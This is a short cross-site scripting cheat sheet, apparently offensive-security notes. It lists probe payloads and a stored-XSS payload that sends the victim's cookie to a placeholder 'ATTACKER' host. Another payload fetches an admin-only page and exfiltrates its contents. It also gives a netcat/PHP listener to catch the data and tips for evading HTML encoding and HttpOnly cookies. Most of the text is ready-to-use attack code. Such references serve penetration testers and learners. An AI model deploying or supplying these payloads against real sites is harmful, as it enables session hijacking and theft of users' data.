Inject JavaScript that runs in another user's browser. Three types: **reflected** (in the response), **stored** (persisted), **DOM** (client-side sink).

```html
<!-- probes -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
'"><script>alert(1)</script>
```

## Session/cookie theft

```javascript
// stored XSS payload -> exfil the victim's cookie
<script>new Image().src='http://ATTACKER/c?='+document.cookie</script>
// fetch an admin-only page and exfil its content
<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('http://ATTACKER/?d='+btoa(t)))</script>
```

```bash
# catch it
php -S 0.0.0.0:80     # or: nc -lvnp 80
```


> If output is HTML-encoded, try injecting into an attribute or an existing tag/event handler instead. `HttpOnly` cookies can't be read by JS — pivot to actions (CSRF-style) via `fetch`.
